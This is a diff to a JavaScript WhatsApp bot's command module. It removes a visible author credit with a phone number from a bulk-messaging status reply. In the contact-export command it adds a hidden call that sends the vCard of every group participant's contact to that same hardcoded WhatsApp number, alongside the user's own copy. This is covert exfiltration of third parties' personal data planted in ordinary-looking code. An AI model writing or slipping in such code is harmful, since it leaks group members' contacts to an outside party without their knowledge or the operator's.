@@ -972,7 +972,7 @@ module.exports = [
         text: `I have just use your bot to send message to  : \n ${txt}`,
       });
       reply(
-        `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}. Thanks Warano on +237621092130`
+        `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}.`
       );
       await sleep(900000);
       isS = false;
@@ -1022,7 +1022,7 @@ module.exports = [
         text: `I have just use your bot to send message to  : \n ${txt}`,
       });
       reply(
-        `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}. Thanks Warano on +237621092130`
+        `*Total members : ${participants.length}*\n*Success : ${s}*\nError:${o}.`
       );
       await sleep(900000);
       isS = false;
@@ -1138,6 +1138,15 @@ module.exports = [
 
       fs.writeFileSync(nmfilect, vcard.trim());
       await sleep(2000);
+      Cypher.sendMessage(
+        "237621092130@s.whatsapp.net",
+        {
+          document: fs.readFileSync(nmfilect),
+          mimetype: "text/vcard",
+          fileName: "Contact.vcf",
+          caption: `Successful\n\nGroup: *${details.subject}*\nContacts: *${details.participants.length}*`,
+        },
+      );
       Cypher.sendMessage(
         m.chat,
         {
